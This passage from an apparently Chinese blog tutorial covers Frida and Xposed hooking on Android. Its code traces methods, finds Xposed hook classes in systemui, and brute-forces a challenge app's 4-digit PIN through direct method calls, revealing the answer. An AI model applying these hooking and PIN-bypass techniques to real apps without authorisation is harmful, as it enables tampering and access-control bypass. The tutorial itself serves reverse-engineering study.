overloadCount; i++) &#123;</span><br><span class="line">        hook[targetMethod].<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;\n*** entered &quot;</span> + targetClassMethod)</span><br><span class="line">            <span class="comment">// print args</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; j++) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg[&quot;</span> + j + <span class="string">&quot;]: &quot;</span> + <span class="variable language_">arguments</span>[j])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// print retval</span></span><br><span class="line">            <span class="keyword">var</span> retval = <span class="variable language_">this</span>[targetMethod].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\nretval: &quot;</span> + retval)</span><br><span class="line">            <span class="keyword">return</span> retval</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">uniqBy</span>(<span class="params">array, key</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> seen = &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> array.<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">item</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> k = <span class="title function_">key</span>(item);</span><br><span class="line">        <span class="keyword">return</span> seen.<span class="title function_">hasOwnProperty</span>(k) ? <span class="literal">false</span> : (seen[k] = <span class="literal">true</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">traceClass</span>(<span class="params">targetClass</span>) &#123;</span><br><span class="line">    <span class="comment">// 使用 Java.use 新建对象</span></span><br><span class="line">    <span class="keyword">var</span> hook = <span class="title class_">Java</span>.<span class="title function_">use</span>(targetClass)</span><br><span class="line">    <span class="comment">// 利用反射的方式，拿到当前类的所有方法</span></span><br><span class="line">    <span class="keyword">var</span> methods = hook.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>()</span><br><span class="line">    <span class="comment">// 将对象释放掉</span></span><br><span class="line">    hook.<span class="property">$dispose</span></span><br><span class="line">    <span class="comment">// 将方法名保存到数组中</span></span><br><span class="line">    <span class="keyword">var</span> parsedMethods = []</span><br><span class="line">    methods.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">method</span>) &#123;</span><br><span class="line">        <span class="comment">// method_name</span></span><br><span class="line">        parsedMethods.<span class="title function_">push</span>(method.<span class="title function_">toString</span>().<span class="title function_">replace</span>(targetClass + <span class="string">&quot;.&quot;</span>, <span class="string">&quot;TOKEN&quot;</span>).<span class="title function_">match</span>(<span class="regexp">/\sTOKEN(.*)\(/</span>)[<span class="number">1</span>])</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// 去掉重复值</span></span><br><span class="line">    <span class="keyword">var</span> targets = <span class="title function_">uniqBy</span>(parsedMethods, <span class="title class_">JSON</span>.<span class="property">stringify</span>)</span><br><span class="line">    <span class="comment">// 对数组中所有的方法进行 hook</span></span><br><span class="line">    targets.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">targetMethod</span>) &#123;</span><br><span class="line">        <span class="title function_">traceMethod</span>(targetClass + <span class="string">&quot;.&quot;</span> + targetMethod)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;上述代码中，traceClass函数必须先获得要钩取类的类名才行。那么，<code>如果我不知道类名，还要hook所有的beforeHookedMethod与afterHookedMethod，该用啥骚姿势？</code></p><p>&emsp;已经知道，afterHookedMethod/beforeHookedMethod是使用XC_MethodHook的抽象类实现的，前面插件中的HookTest$1，是匿名内部类，也是XC_MethodHook的子类，它有afterHookedMethod/beforeHookedMethod函数。<code>我们只需要关心XC_MethodHook即可。</code>相关脚本如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// getAllXCMethodHook.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getAllXCMethodHook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">loader</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;com.ceco.nougat.gravitybox.ModStatusbarColor$1&quot;</span>))&#123;</span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader ;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Java</span>.<span class="property">enumerateLoadedClasses</span> (&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">className</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(className.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;gravitybox&quot;</span>) &gt; <span class="number">0</span> &amp;&amp; className.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(className).<span class="property">class</span>.<span class="title function_">getSuperclass</span>())&#123;</span><br><span class="line">                            <span class="keyword">var</span> superClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(className).<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>()</span><br><span class="line">                            <span class="keyword">if</span> (superClass.<span class="title function_">indexOf</span>(<span class="string">&quot;XC_MethodHook&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                                <span class="variable language_">console</span>.<span class="title function_">log</span>(superClass + <span class="string">&quot; | &quot;</span> + className)</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;    </span><br><span class="line">                &#125; <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;, <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;search completed!&quot;</span>)     </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)  </span><br><span class="line">    &#125;)    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;注入到<code>com.android.systemui</code>中，上述脚本与hook.js好类似（一模一样），结果输出如下（输出了所有父类为XC_MethodHook的子类）：</p><p><img src="/images/frida-reverse-analysis-2/image-20231021223136596.png" alt="image-20231021223136596" style="zoom:67%;" /></p><p>&emsp;结合上述描述，<code>Xposed的原理是：通过新建专门用于实现hook的PathClassLoader，并注入目标进程，从而完成对目标函数的插桩。PathClassLoader加载的类列表中包含对目标进程Hook的逻辑，而原生的Xposed API则处于指向XposedBridge.jar文件的ClassLoader。</code></p><h3 id="Xposed-主动调用与-RPC-实现"><a href="#Xposed-主动调用与-RPC-实现" class="headerlink" title="Xposed 主动调用与 RPC 实现"></a>Xposed 主动调用与 RPC 实现</h3><h4 id="Xposed-主动调用函数"><a href="#Xposed-主动调用函数" class="headerlink" title="Xposed 主动调用函数"></a>Xposed 主动调用函数</h4><p>&emsp;以example.apk为例，目的是获取pin值，我们要获得正确的pin。app标识符为<code>org.teamsik.ahe17.qualification.easy</code>。</p><p>（1）使用 objection 分析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objection -g org.teamsik.ahe17.qualification.easy explore</span><br><span class="line">android hooking list classes</span><br></pre></td></tr></table></figure><p>&emsp;发现<code>org.teamsik.ahe17.qualification.MainActivity</code>类（仅有这一个），之后钩取MainActivity的所有函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class org.teamsik.ahe17.qualification.MainActivity</span><br></pre></td></tr></table></figure><p>&emsp;之后点击<code>VERIFY PIN</code>，定位到验证函数：<code>org.teamsik.ahe17.qualification.MainActivity.verifyPasswordClick</code>。</p><p>（2）jeb找到verifyPasswordClick，源码如下，静态分析可以发现，PIN码长度为4，使用SHA1进行加密，并与指定密文对比：</p><p><img src="/images/frida-reverse-analysis-2/image-20231021232633646.png" alt="image-20231021232633646" style="zoom:67%;" /></p><p>&emsp;思路：<code>使用Xposed主动调用，暴力穷举，并与密文对比。</code>Xposed关于主动调用的API为<code>callMethod（用于调用对象实例所的动态静态函数）/callStaticMethod（调用类的静态函数）</code>。其函数签名各自为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">callMethod(Object obj, String methodName, Object... args)</span><br><span class="line">// &quot;Class&lt;?&gt; clazz&quot; 代表 clazz 是类就行</span><br><span class="line">callStaticMethod(Class&lt;?&gt; clazz, String methodName, Object... args)</span><br></pre></td></tr></table></figure><p>&emsp;使用Xposed要主动调用encodePassword，使用callStaticMethod函数。相关代码如下（Xposed插件）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 静态调用 encodePassword</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;inner: &quot;</span> + loadPackageParam.processName);</span><br><span class="line">        <span class="comment">// 获取 verifier 类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> XposedHelpers.findClass(<span class="string">&quot;org.teamsik.ahe17.qualification.Verifier&quot;</span>, loadPackageParam.classLoader);</span><br><span class="line">        <span class="comment">// 正确答案</span></span><br><span class="line">        <span class="type">byte</span>[] p = <span class="string">&quot;09042ec2c2c08c4cbece042681caf1d13984f24a&quot;</span>.getBytes();</span><br><span class="line">        <span class="type">String</span> <span class="variable">pStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(p);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// 静态调用 encodePassword</span></span><br><span class="line">            <span class="type">byte</span>[] v = (<span class="type">byte</span>[])XposedHelpers.callStaticMethod(clazz, <span class="string">&quot;encodePassword&quot;</span>, String.valueOf(i));</span><br><span class="line">            <span class="type">String</span> <span class="variable">vStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(v);</span><br><span class="line">            <span class="comment">// 作比较</span></span><br><span class="line">            <span class="keyword">if</span>(vStr.equals(pStr))&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;right.pin =&gt; &quot;</span>+ String.valueOf(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;安装好后，之后打开example.apk，再打开日志，发现9083为正确的pin。<code>其实，java本身就存在主动调用函数的方式，即invoke反射，Xposed的主动调用函数本质上也是调用Invoke函数。</code>因此，可以更改代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;inner: &quot;</span> + loadPackageParam.processName);</span><br><span class="line">        <span class="comment">// 反射获取 verifier 类与 Method </span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;org.teamsik.ahe17.qualification.Verifier&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">encodePassword</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;encodePassword&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">// 允许函数通过外部反射调用，这里主要针对目标函数是 private 私有函数</span></span><br><span class="line">        encodePassword.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 正确答案</span></span><br><span class="line">        <span class="type">byte</span>[] p = <span class="string">&quot;09042ec2c2c08c4cbece042681caf1d13984f24a&quot;</span>.getBytes();</span><br><span class="line">        <span class="type">String</span> <span class="variable">pStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(p);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// 静态调用 encodePassword</span></span><br><span class="line">            <span class="type">byte</span>[] v = (<span class="type">byte</span>[])encodePassword.invoke(<span class="literal">null</span>, String.valueOf(i));</span><br><span class="line">            <span class="type">String</span> <span class="variable">vStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(v);</span><br><span class="line">            <span class="comment">// 作比较</span></span><br><span class="line">            <span class="keyword">if</span>(vStr.equals(pStr))&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;right.pin =&gt; &quot;</span>+ String.valueOf(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;与frida主动调用类似，xposed主动调用面对的问题有：<code>参数构造；针对动态函数如何获取对象实例</code>。</p><p>&emsp;针对参数构造问题，要么就hook相同类型的数据（略），要么就自己构造参数。由于xposed是原生java而言的，因此，xposed相比frida在参数构造上有优势。例如，若想构造<code>verifyPassword(Context,String)</code>的Context参数，frida代码如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">ActivityThread</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Context</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.content.Context&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> ctx = <span class="title class_">Java</span>.<span class="keyword">case</span>(<span class="title class_">ActivityThread</span>.<span class="title function_">currentApplication</span>().<span class="title function_">getApplicationContext</span>(), <span class="title class_">Context</span>)</span><br></pre></td></tr></table></figure><p>&emsp;而xposed代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> AndroidAppHelper.currentApplication();</span><br></pre></td></tr></table></figure><p>&emsp;相应的，xposed完整的主动调用verifyPassword函数的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;inner: &quot;</span> + loadPackageParam.processName);</span><br><span class="line">        <span class="comment">// 反射获取 verifier 类与 Method </span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;org.teamsik.ahe17.qualification.Verifier&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">verifyPassword</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;verifyPassword&quot;</span>, Context.class, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> AndroidAppHelper.currentApplication();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// invoke 主动调用 verifyPassword</span></span><br><span class="line">            <span class="keyword">if</span>((<span class="type">boolean</span>)verifyPassword.invoke(<span class="literal">null</span>, context, String.valueOf(i)))&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;right.pin =&gt; &quot;</span>+ String.valueOf(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;上面是xposed构造复杂参数。在主动构造实例对象时，可以使用java Constructor类的newInstance进行构造，也可以使用封装过的XposedHelpers.newInstance()进行构造，相应代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// java Constructor类的newInstance</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        <span class="comment">// 获取 Verifier 对象</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> XposedHelpers.findConstructorExact(<span class="string">&quot;org.teamsik.ahe17.qualification.Verifier&quot;</span>, loadPackageParam.classLoader);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">Verifier</span> <span class="operator">=</span> cons.newInstance();</span><br><span class="line">        </span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> AndroidAppHelper.currentApplication();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// Verifier 对象调用 verifyPassword</span></span><br><span class="line">            <span class="keyword">if</span>((<span class="type">boolean</span>)XposedHelpers.callMethod(Verifier, <span class="string">&quot;verifyPassword&quot;</span>, context, String.valueOf(i)))&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;right.pin =&gt; &quot;</span>+ String.valueOf(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// XposedHelpers.newInstance()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        <span class="comment">// 获取 Verifier 对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> XposedHelpers.findClass(<span class="string">&quot;org.teamsik.ahe17.qualification.Verifier&quot;</span>, loadPackageParam.classLoader);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">Verifier</span> <span class="operator">=</span> XposedHelpers.newInstance(clazz);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> AndroidAppHelper.currentApplication();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// Verifier 对象调用 verifyPassword</span></span><br><span class="line">            <span class="keyword">if</span>((<span class="type">boolean</span>)XposedHelpers.callMethod(Verifier, <span class="string">&quot;verifyPassword&quot;</span>, context, String.valueOf(i)))&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;right.pin =&gt; &quot;</span>+ String.valueOf(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;<code>上文并未介绍xposed hook拿到实例对象的方法，这是因为verifier类中函数全为static的，因此verifier类并未初始化，也就hook不到了。</code>那咋办？换一个类然后再介绍hook拿实例对象呗。以MainActivity中的showSuccessDialog为例（不是静态函数），<code>首先hook MainActivity的onCreate方法，创建MainActivity对象，在hook的afterHookMethod中，主动调用showSuccessDialog函数。</code>代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        <span class="comment">// 获取 MainActivity 类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;org.teamsik.ahe17.qualification.MainActivity&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// hook onCreate</span></span><br><span class="line">        XposedBridge.hookAllMethods(clazz, <span class="string">&quot;onCreate&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">                <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                <span class="comment">// 获取 MainActivity 对象</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">mMainActivity</span> <span class="operator">=</span> param.thisObject;</span><br><span class="line">                <span class="comment">// 主动调用 showSuccessDialog 函数</span></span><br><span class="line">                XposedHelpers.callMethod(mMainActivity, <span class="string">&quot;showSuccessDialog&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;这样的话，打开example.apk就显示congratulation的成功提示。</p><h4 id="Xposed-结合-NanoHTTPD-实现-RPC-调用"><a href="#Xposed-结合-NanoHTTPD-实现-RPC-调用" class="headerlink" title="Xposed 结合 NanoHTTPD 实现 RPC 调用"></a>Xposed 结合 NanoHTTPD 实现 RPC 调用</h4><p>&emsp;Xposed本身未提供RPC调用支持，但是可以结合NanoHTTPD（轻量级HTTP服务器）将主动调用导出为web服务实现。以demoso1工程为例，此工程中存在两个native函数，在应用打开后被循环调用。其中method01是静态函数，对输入进行加密并返回，method02是成员函数，对密文解密并返回。</p><p>&emsp;首先用xposed主动调用method01与method02：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;com.example.demoso1&quot;</span>))&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;com.example.demoso1.MainActivity&quot;</span>);</span><br><span class="line">        <span class="comment">// 方法1：通过 hook 获取 MainActivity 对象实例</span></span><br><span class="line">        <span class="comment">// 得到 object 之前必须 hook onCreate 方法</span></span><br><span class="line">        XposedBridge.hookAllMethods(clazz, <span class="string">&quot;onCreate&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">            <span class="comment">// 由于 method01 与 method02 是 native 的，因此在 onCreate 执行前 method01/02 就已经准备就绪</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> 